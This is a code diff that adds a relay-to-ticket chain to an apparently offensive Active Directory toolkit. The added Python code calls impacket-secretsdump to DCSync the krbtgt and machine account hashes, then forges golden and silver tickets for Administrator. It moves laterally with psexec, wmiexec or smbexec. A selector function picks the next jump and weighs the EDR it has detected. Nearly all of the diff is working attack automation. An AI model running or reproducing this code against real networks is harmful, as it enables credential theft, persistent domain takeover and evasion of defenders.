@@ -1117,6 +1117,331 @@ flowchart TB
 
 
 # ============================================================
+# RELAY NINJA INTEGRATION
+# ============================================================
+
+class RelayToTicketChain:
+    """
+    Relay → Ticket Forge → Lateral Jump Integration
+    
+    Combines NTLM relay with Kerberos ticket forging for
+    rapid domain takeover.
+    
+    Flow:
+    1. Coerce authentication (PrinterBug/ShadowCoerce)
+    2. Capture TGT via krbrelayx
+    3. Use TGT for S4U2Self impersonation
+    4. Forge service tickets for lateral movement
+    5. DCSync for full compromise
+    """
+    
+    def __init__(self, scan_id: int = 0):
+        self.scan_id = scan_id
+        self.golden_forger = GoldenTicketForger(scan_id)
+        self.silver_forger = SilverTicketForger(scan_id)
+    
+    def _log(self, msg_type: str, message: str):
+        log_to_intel(self.scan_id, f"RELAY_CHAIN_{msg_type}", message)
+        logger.info(f"[RELAY_CHAIN][{msg_type}] {message}")
+    
+    def relay_to_golden(
+        self,
+        captured_tgt_path: str,
+        domain: str,
+        dc_ip: str,
+        domain_sid: str = None
+    ) -> Optional[KerberosTicket]:
+        """
+        Use captured TGT to get krbtgt hash and forge golden ticket
+        
+        Args:
+            captured_tgt_path: Path to captured .ccache file
+            domain: Target domain
+            dc_ip: DC IP address
+            domain_sid: Domain SID (auto-detected if None)
+        
+        Returns:
+            Golden ticket if successful
+        """
+        self._log("START", "Relay → Golden Ticket chain initiated")
+        
+        # Step 1: Use TGT for DCSync to get krbtgt hash
+        self._log("DCSYNC", "Extracting krbtgt hash via DCSync")
+        
+        env = os.environ.copy()
+        env['KRB5CCNAME'] = captured_tgt_path
+        
+        try:
+            cmd = [
+                "impacket-secretsdump",
+                "-k", "-no-pass",
+                f"{domain}/@{dc_ip}",
+                "-just-dc-user", "krbtgt"
+            ]
+            
+            result = subprocess.run(
+                cmd,
+                capture_output=True,
+                text=True,
+                timeout=120,
+                env=env
+            )
+            
+            output = result.stdout + result.stderr
+            
+            # Parse krbtgt hash
+            match = re.search(r'krbtgt:\d+:([a-fA-F0-9]+):([a-fA-F0-9]+)', output)
+            if match:
+                lm_hash = match.group(1)
+                nt_hash = match.group(2)
+                self._log("SUCCESS", f"Got krbtgt NT hash: {nt_hash[:16]}...")
+                
+                # Step 2: Get domain SID if not provided
+                if not domain_sid:
+                    domain_sid = self._get_domain_sid(domain, dc_ip, env)
+                
+                # Step 3: Forge golden ticket
+                golden = self.golden_forger.forge_golden_ticket(
+                    domain=domain,
+                    domain_sid=domain_sid,
+                    krbtgt_hash=nt_hash,
+                    target_user="Administrator",
+                    user_id=500,
+                    groups=[512, 519, 518, 520],
+                    duration_hours=240  # 10 days
+                )
+                
+                if golden and golden.status == TicketStatus.FORGED:
+                    self._log("GOLDEN", f"🎫 Golden ticket forged: {golden.ticket_path}")
+                    return golden
+                    
+        except Exception as e:
+            self._log("ERROR", f"Relay → Golden failed: {e}")
+        
+        return None
+    
+    def relay_to_silver(
+        self,
+        captured_tgt_path: str,
+        domain: str,
+        dc_ip: str,
+        target_spn: str,
+        target_service: str = "cifs"
+    ) -> Optional[KerberosTicket]:
+        """
+        Use captured TGT to extract service account hash and forge silver ticket
+        
+        Args:
+            captured_tgt_path: Path to captured .ccache file
+            domain: Target domain
+            dc_ip: DC IP address
+            target_spn: Target SPN (e.g., cifs/fileserver.corp.local)
+            target_service: Service name
+        
+        Returns:
+            Silver ticket if successful
+        """
+        self._log("START", f"Relay → Silver Ticket chain for {target_spn}")
+        
+        env = os.environ.copy()
+        env['KRB5CCNAME'] = captured_tgt_path
+        
+        try:
+            # Extract service account hash
+            service_host = target_spn.split('/')[1].split('.')[0]
+            
+            cmd = [
+                "impacket-secretsdump",
+                "-k", "-no-pass",
+                f"{domain}/@{dc_ip}",
+                "-just-dc-user", f"{service_host}$"
+            ]
+            
+            result = subprocess.run(
+                cmd,
+                capture_output=True,
+                text=True,
+                timeout=120,
+                env=env
+            )
+            
+            output = result.stdout + result.stderr
+            
+            # Parse machine account hash
+            match = re.search(rf'{service_host}\$:\d+:([a-fA-F0-9]+):([a-fA-F0-9]+)', output, re.I)
+            if match:
+                nt_hash = match.group(2)
+                self._log("SUCCESS", f"Got {service_host}$ NT hash")
+                
+                # Forge silver ticket
+                silver = self.silver_forger.forge_silver_ticket(
+                    domain=domain,
+                    target_spn=target_spn,
+                    service_hash=nt_hash,
+                    target_user="Administrator",
+                    target_service=target_service,
+                    target_host=service_host
+                )
+                
+                if silver and silver.status == TicketStatus.FORGED:
+                    self._log("SILVER", f"🎫 Silver ticket forged: {silver.ticket_path}")
+                    return silver
+                    
+        except Exception as e:
+            self._log("ERROR", f"Relay → Silver failed: {e}")
+        
+        return None
+    
+    def relay_to_lateral_jump(
+        self,
+        captured_tgt_path: str,
+        domain: str,
+        dc_ip: str,
+        target_host: str,
+        action: str = "exec"
+    ) -> Dict[str, Any]:
+        """
+        Use captured TGT for lateral movement
+        
+        Args:
+            captured_tgt_path: Path to captured .ccache file
+            domain: Target domain
+            dc_ip: DC IP address
+            target_host: Host to move to
+            action: exec, psexec, wmiexec, smbexec
+        
+        Returns:
+            Result of lateral movement attempt
+        """
+        self._log("LATERAL", f"Jumping to {target_host} via {action}")
+        
+        env = os.environ.copy()
+        env['KRB5CCNAME'] = captured_tgt_path
+        
+        result = {
+            'success': False,
+            'target': target_host,
+            'action': action,
+            'output': '',
+            'error': ''
+        }
+        
+        try:
+            if action in ['psexec', 'exec']:
+                cmd = [
+                    "impacket-psexec",
+                    "-k", "-no-pass",
+                    f"{domain}/Administrator@{target_host}",
+                    "whoami"
+                ]
+            elif action == 'wmiexec':
+                cmd = [
+                    "impacket-wmiexec",
+                    "-k", "-no-pass",
+                    f"{domain}/Administrator@{target_host}",
+                    "whoami"
+                ]
+            elif action == 'smbexec':
+                cmd = [
+                    "impacket-smbexec",
+                    "-k", "-no-pass",
+                    f"{domain}/Administrator@{target_host}",
+                    "whoami"
+                ]
+            else:
+                result['error'] = f"Unknown action: {action}"
+                return result
+            
+            proc_result = subprocess.run(
+                cmd,
+                capture_output=True,
+                text=True,
+                timeout=60,
+                env=env
+            )
+            
+            result['output'] = proc_result.stdout
+            
+            if "nt authority\\system" in proc_result.stdout.lower() or \
+               "administrator" in proc_result.stdout.lower():
+                result['success'] = True
+                self._log("SUCCESS", f"🎯 Lateral jump to {target_host} successful!")
+            else:
+                result['error'] = proc_result.stderr
+                
+        except Exception as e:
+            result['error'] = str(e)
+            self._log("ERROR", f"Lateral jump failed: {e}")
+        
+        return result
+    
+    def _get_domain_sid(self, domain: str, dc_ip: str, env: dict) -> str:
+        """Get domain SID via LDAP"""
+        try:
+            cmd = [
+                "impacket-lookupsid",
+                "-k", "-no-pass",
+                f"{domain}/@{dc_ip}",
+                "0"
+            ]
+            
+            result = subprocess.run(
+                cmd,
+                capture_output=True,
+                text=True,
+                timeout=30,
+                env=env
+            )
+            
+            # Parse SID
+            match = re.search(r'Domain SID is: (S-1-5-21-[\d-]+)', result.stdout)
+            if match:
+                return match.group(1)
+                
+        except Exception:
+            pass
+        
+        return "S-1-5-21-0-0-0"  # Placeholder
+
+
+def get_next_best_jump(
+    delegation_targets: List[dict],
+    current_access: dict = None,
+    detected_edr: str = "none"
+) -> dict:
+    """
+    AI-powered next best lateral jump selector
+    
+    Analyzes delegation weak spots and recommends optimal path.
+    
+    Args:
+        delegation_targets: List of discovered delegation targets
+        current_access: Current access level info
+        detected_edr: Detected EDR (none, crowdstrike, sentinelone, etc.)
+    
+    Returns:
+        Recommendation dict with target, score, and action
+    """
+    from cybermodules.kerberos_relay_ninja import AIJumpSelector, DelegationTarget, DelegationType
+    
+    # Convert dicts to DelegationTarget objects
+    targets = []
+    for t in delegation_targets:
+        target = DelegationTarget(
+            name=t.get('name', ''),
+            samaccountname=t.get('samaccountname', ''),
+            dns_hostname=t.get('dns_hostname', ''),
+            delegation_type=DelegationType(t.get('delegation_type', 'unconstrained')),
+            is_dc=t.get('is_dc', False),
+            is_high_value=t.get('is_high_value', False),
+        )
+        targets.append(target)
+    
+    selector = AIJumpSelector()
+    return selector.get_next_best_jump(targets, current_access, detected_edr)
+
+
+# ============================================================
 # EXPORTS
 # ============================================================
 
@@ -1140,4 +1465,8 @@ __all__ = [
     'SilverTicketForger',
     'GoldenTicketForger',
     'KerberosAttackChain',
+    
+    # Relay integration
+    'RelayToTicketChain',
+    'get_next_best_jump',
 ]
